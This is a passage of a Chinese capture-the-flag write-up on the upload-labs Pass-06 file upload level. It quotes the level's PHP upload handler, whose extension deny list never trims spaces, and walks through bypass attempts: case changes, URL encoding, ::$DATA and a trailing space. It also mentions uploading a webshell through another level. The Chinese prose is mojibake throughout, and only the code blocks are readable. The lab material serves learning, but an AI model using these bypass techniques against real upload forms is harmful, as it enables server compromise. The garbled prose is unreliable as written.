src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.18.33.png" style="zoom:50%;"><ul><li>ä»…æ”¹åç¼€å.jpgä¸Šä¼ æˆåŠŸ=&gt;æ²¡æœ‰æ£€æŸ¥æ–‡ä»¶å¤´ã€‚</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.19.10.png" style="zoom:50%;"><ul><li>åŒæ—¶content-typeæ˜¯text/php ä¸Šä¼ æˆåŠŸ=&gt;æ²¡æœ‰æ£€æµ‹MIMEç±»å‹</li><li>å°è¯•æ”¹åç¼€åç»•è¿‡ï¼š</li></ul><p>.PHP .PHTMLâŒ</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.20.59.png" style="zoom:50%;"><p>.htaccessä¹Ÿbanäº†ï¼Œå¹¶ä¸”å¤§å°å†™ç»•è¿‡å¤±è´¥ã€‚è²Œä¼¼æ²¡åŠæ³•ä½¿ç”¨è¦†ç›–é…ç½®æ–‡ä»¶å°†jpgæŒ‰ç…§phpè§£æçš„æ–¹æ³•äº†ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.22.45.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.23.41.png" style="zoom:50%;"><ul><li>å°è¯•ä¸€äº›åµŒå¥—çš„æ–‡ä»¶å</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.26.03.png" style="zoom:50%;"><p>.PHPphp3 èƒ½ä¸Šä¼ ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°åç«¯å°†åç¼€éƒ½è½¬åŒ–ä¸ºå°å†™äº†ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.27.36.png" style="zoom:50%;"><p>ä½†æ˜¯å¹¶ä¸èƒ½è¢«æ‰§è¡Œã€‚</p><p>åˆ°ç›®å‰è¿™ä¸ªçŠ¶æ€æˆ‘æƒ³è¿˜å‰©ä¸¤ä¸ªæ€è·¯ï¼š1ï¼‰æƒ³åŠæ³•æŠŠjpgè§£ææˆphpã€‚ 2ï¼‰æƒ³åŠæ³•ç»•è¿‡åç¼€åçš„æ£€æµ‹ã€‚</p><ul><li>æœ‰æ²¡å¯èƒ½å­˜åœ¨ä»€ä¹ˆè§£ææ¼æ´èƒ½è¢«åˆ©ç”¨å‘¢ï¼Ÿ</li></ul><p>ä½¿ç”¨fscanæ‰«ä¸€ä¸‹ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.31.18.png" style="zoom:50%;"><p>æ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„ç»“æœã€‚</p><ul><li>çœ‹ä¸‹æç¤ºï¼ˆç¬¬ä¸€æ¬¡çœ‹æç¤ºï¼‰</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.32.13.png" style="zoom:50%;"><p>å¹¶æ²¡æœ‰ç¦æ­¢.htaccessæ–‡ä»¶å‘€ã€‚</p><ul><li>çœ‹ä¸‹æºä»£ç ï¼š</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç é‡Œé¢å…¶å®<code>.htaccess</code>è¢«ç¦äº†çš„ï¼Œè¿™æç¤ºä¹Ÿå¤ªä¸åšé“äº†ã€‚</p><ul><li>URLç¼–ç åç¼€åç»•è¿‡å°è¯•ï¼ˆå¤±è´¥ï¼‰</li></ul><p>å°è¯•å°†.phpè¿›è¡ŒURLç¼–ç ä¸Šä¼ æˆåŠŸäº†ã€‚ä½†æ˜¯è®¿é—®çš„æ—¶å€™æµè§ˆå™¨ä¼šè‡ªåŠ¨è§£ç è®¿é—®å¤±è´¥ã€‚</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.47.37.png" alt="æˆªå±2025-01-22 16.47.37"></p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.48.45.png" style="zoom:50%;"><p>å°è¯•å†åŠ ä¸€å±‚URLç¼–ç è®¿é—®ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.49.49.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯è¢«å½“ä½œæ–‡æœ¬å†…å®¹è¾“å‡ºäº†ï¼Œå¹¶æ²¡æœ‰è¢«è§£ææ‰§è¡Œã€‚</p><ul><li>æ–‡ä»¶åæœ€åæ·»åŠ ::$DATAç»•è¿‡å°è¯•ï¼ˆå¤±è´¥ï¼‰</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.51.40.png" style="zoom:50%;"><p>::$DATAå…¶å®æ˜¯windowsç‰¹æ€§ï¼Œå¹¶ä¸”åœ¨ä»£ç ä¸­ä¼šè¢«æ›¿æ¢ä¸ºç©ºã€‚</p><blockquote><p>$_FILES:</p><p>åœ¨PHPä¸­ï¼Œ<code>$_FILES</code>æ˜¯ä¸€ä¸ªè¶…å…¨å±€å˜é‡ï¼Œç”¨äºå­˜å‚¨æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„æ•°æ®ã€‚å½“ä½ é€šè¿‡HTMLè¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶ï¼ŒPHPä¼šè‡ªåŠ¨å°†ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯å­˜å‚¨åˆ°<code>$_FILES</code>æ•°ç»„ä¸­ã€‚<code>$_FILES['upload_file']['tmp_name']</code>æ˜¯è¿™ä¸ªæ•°ç»„ä¸­çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ï¼Œå®ƒè¡¨ç¤ºä¸Šä¼ æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚</p><p>ä»¥ä¸‹æ˜¯å¯¹<code>$_FILES['upload_file']['tmp_name']</code>çš„è¯¦ç»†è§£é‡Šï¼š</p><ol><li><strong><code>$_FILES</code>æ•°ç»„çš„ç»“æ„</strong></li></ol><p>å½“ç”¨æˆ·é€šè¿‡è¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œ<code>$_FILES</code>æ•°ç»„ä¼šåŒ…å«ä»¥ä¸‹é”®å€¼å¯¹ï¼ˆä»¥<code>&lt;input type="file" name="upload_file"&gt;</code>ä¸ºä¾‹ï¼‰ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string single-quoted-string">'name'</span>     <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'æ–‡ä»¶çš„åŸå§‹åç§°'</span><span class="token punctuation">,</span> <span class="token comment">// ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶å</span>    <span class="token string single-quoted-string">'type'</span>     <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'æ–‡ä»¶çš„MIMEç±»å‹'</span><span class="token punctuation">,</span> <span class="token comment">// æ–‡ä»¶çš„MIMEç±»å‹ï¼ˆå¦‚image/jpegï¼‰</span>    <span class="token string single-quoted-string">'size'</span>     <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'æ–‡ä»¶çš„å¤§å°'</span><span class="token punctuation">,</span>     <span class="token comment">// æ–‡ä»¶çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</span>    <span class="token string single-quoted-string">'tmp_name'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'ä¸´æ—¶æ–‡ä»¶è·¯å¾„'</span><span class="token punctuation">,</span>   <span class="token comment">// æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶å­˜å‚¨è·¯å¾„</span>    <span class="token string single-quoted-string">'error'</span>    <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'é”™è¯¯ä»£ç '</span>        <span class="token comment">// æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­å¯èƒ½å‘ç”Ÿçš„é”™è¯¯ä»£ç </span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><strong><code>tmp_name</code>çš„ä½œç”¨</strong></li></ol><ul><li><strong>ä¸´æ—¶å­˜å‚¨è·¯å¾„</strong>ï¼š<code>$_FILES['upload_file']['tmp_name']</code>æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºä¸Šä¼ æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚</li><li><strong>æ–‡ä»¶ä¸Šä¼ æœºåˆ¶</strong>ï¼šå½“æ–‡ä»¶è¢«ä¸Šä¼ åˆ°æœåŠ¡å™¨æ—¶ï¼ŒPHPä¼šè‡ªåŠ¨å°†æ–‡ä»¶å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç›®å½•ä¸­ï¼ˆé€šå¸¸æ˜¯<code>/tmp</code>ç›®å½•æˆ–ç”±<code>php.ini</code>é…ç½®çš„<code>upload_tmp_dir</code>è·¯å¾„ï¼‰ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„å°±æ˜¯<code>tmp_name</code>çš„å€¼ã€‚</li><li><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šä¸´æ—¶æ–‡ä»¶åœ¨è„šæœ¬æ‰§è¡Œå®Œæˆåä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œé™¤éä½ å°†å…¶ç§»åŠ¨åˆ°å…¶ä»–ä½ç½®ï¼ˆå¦‚ä½¿ç”¨<code>move_uploaded_file()</code>å‡½æ•°ï¼‰ã€‚</li></ul><ol start="3"><li><strong>ä¸ºä»€ä¹ˆéœ€è¦<code>tmp_name</code>ï¼Ÿ</strong></li></ol><ul><li><strong>å®‰å…¨æ€§å’Œéš”ç¦»æ€§</strong>ï¼šä¸Šä¼ çš„æ–‡ä»¶é¦–å…ˆè¢«å­˜å‚¨åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œè€Œä¸æ˜¯ç›´æ¥å­˜å‚¨åœ¨ç›®æ ‡ç›®å½•ä¸­ã€‚è¿™å¯ä»¥é˜²æ­¢æ¶æ„æ–‡ä»¶åœ¨æœªç»è¿‡éªŒè¯ä¹‹å‰ç›´æ¥è¢«è®¿é—®ã€‚</li><li><strong>å¤„ç†ä¸Šä¼ æ–‡ä»¶</strong>ï¼š<code>tmp_name</code>æä¾›äº†æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„å®é™…è·¯å¾„ï¼Œä½ å¯ä»¥é€šè¿‡å®ƒè¯»å–æ–‡ä»¶å†…å®¹ã€éªŒè¯æ–‡ä»¶ç±»å‹æˆ–å°†å…¶ç§»åŠ¨åˆ°æœ€ç»ˆå­˜å‚¨ä½ç½®ã€‚</li></ul><ol start="4"><li><strong>å¦‚ä½•æ­£ç¡®ä½¿ç”¨<code>tmp_name</code></strong></li></ol><p>åœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œ<code>tmp_name</code>é€šå¸¸ä¸<code>move_uploaded_file()</code>å‡½æ•°ä¸€èµ·ä½¿ç”¨ï¼Œå°†æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°ç›®æ ‡ç›®å½•ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// æ£€æŸ¥æ˜¯å¦æœ‰ä¸Šä¼ é”™è¯¯</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„</span>    <span class="token variable">$destination</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uploads/'</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ç›®æ ‡è·¯å¾„</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$destination</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ç§»åŠ¨å¤±è´¥ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><ul><li>åç¼€åæ·»åŠ ç©ºæ ¼å°è¯•ç»•è¿‡</li></ul><p>åˆ†æä»£ç ï¼Œå¤„ç†åç¼€æ—¶æœ€åæ²¡æœ‰ç”¨trimå‡½æ•°å»é™¤åç¼€åä¸¤è¾¹ç©ºæ ¼ï¼Œå¦‚ï¼š    $file_ext = trim($file_ext); //é¦–å°¾å»ç©ºã€‚</p><blockquote><p><code>trim()</code> æ˜¯ PHP ä¸­ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œç”¨äºåˆ é™¤å­—ç¬¦ä¸²é¦–å°¾çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–æŒ‡å®šå­—ç¬¦ã€‚</p></blockquote><p><code>.phpç©ºæ ¼</code></p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.19.16.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.17.58.png" style="zoom:50%;"><p>æ— æ³•è§£ææ‰§è¡Œã€‚</p><p>ä¸åŠ %20è®¿é—®æ—¶404.</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.22.45.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.23.58.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°åœ¨åç¼€åä¸­æ·»åŠ ç©ºæ ¼èƒ½å¤Ÿç»•è¿‡åç¼€åçš„æ£€æŸ¥ã€‚ä½†æ˜¯å¦‚ä½•è®©æœåŠ¡å™¨è§£ææ‰§è¡Œå‘¢ï¼Ÿ</p><h2 id="6-3-å…³å¡ç‰¹æ€§åˆ†æ"><a href="#6-3-å…³å¡ç‰¹æ€§åˆ†æ" class="headerlink" title="6.3 å…³å¡ç‰¹æ€§åˆ†æ"></a>6.3 å…³å¡ç‰¹æ€§åˆ†æ</h2><p>æ³¨ï¼šè¿™é¢˜çš„è¯é¶æœºå¿…é¡»æ˜¯windowsçš„ï¼Œåœ¨linuxä¸Šé¢æ— æ•ˆã€‚</p><p>å…¶å®è¿™ä¸€é¢˜åœ¨Linuxä¸Šæ˜¯æ— æ³•å®ç°çš„ï¼Œå› ä¸º<code>xxx.phpç©ºæ ¼</code>è™½ç„¶èƒ½ç»•è¿‡åç¼€åçš„æ£€æµ‹ï¼Œä½†æ˜¯å­˜å‚¨åœ¨linuxæœåŠ¡å™¨ä¸Šæ—¶å¹¶ä¸ä¼šåƒwindowsä¸€æ ·åˆ é™¤ç©ºæ ¼ï¼ˆå³å­˜å‚¨ä¸º<code>xxx.php</code>ï¼‰ã€‚æ‰€ä»¥è¦æƒ³è®¿é—®åªèƒ½+%20çš„ç©ºæ ¼urlç¼–ç ï¼Œä½†æ˜¯æƒ³è¦è¢«è§£æçš„è¯åˆä¸èƒ½æ·»åŠ ç©ºæ ¼çš„urlç¼–ç ï¼Œæ‰€ä»¥åœ¨linuxä¸Šæ˜¯æ— æ³•ç»•è¿‡çš„ã€‚è¯´ç™½äº†åœ¨linuxä¸Šä¸Šä¼ çš„æ˜¯<code>xxx.phpç©ºæ ¼</code>ï¼Œé‚£ä¹ˆä¿å­˜çš„å°±æ˜¯<code>xxx.phpç©ºæ ¼</code>ï¼ŒåŠ ç©ºæ ¼è™½ç„¶èƒ½ç»•è¿‡åç¼€åæ£€æµ‹ï¼Œä½†æ˜¯æ— æ³•è¢«è§£ææ‰§è¡Œï¼ŒæœåŠ¡å™¨ä¸Šä¸å­˜åœ¨<code>xxx.php</code>çš„æ–‡ä»¶ã€‚åœ¨windowsä¸Šçš„è¯æ—¢èƒ½ç»•è¿‡åç¼€åæ£€æµ‹ï¼Œåˆèƒ½åœ¨æœåŠ¡ç«¯ä¿å­˜æ—¶åˆ æ‰ç©ºæ ¼ï¼Œè¢«å½“ä½œæ­£å¸¸çš„phpæ–‡ä»¶è¿›è¡Œè§£æï¼Œèƒ½è¢«å®Œç¾åˆ©ç”¨ã€‚</p><p>é€šè¿‡å…¶ä»–å…³å¡ä¸Šä¼ webshellæŸ¥çœ‹åå°å¯¹Pass-06å­˜å‚¨çš„æ–‡ä»¶çš„ä¿å­˜æƒ…å†µï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.38.57.png" alt="é€šè¿‡Pass05ä¸Šä¼ webshell" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.40.13.png" alt="é€šè¿‡Pass05ä¸Šä¼ çš„webshell" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2017.41.54.png" alt="Pass-06é€šè¿‡åœ¨æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡åç¼€åæ£€æµ‹" style="zoom:50%;"><img 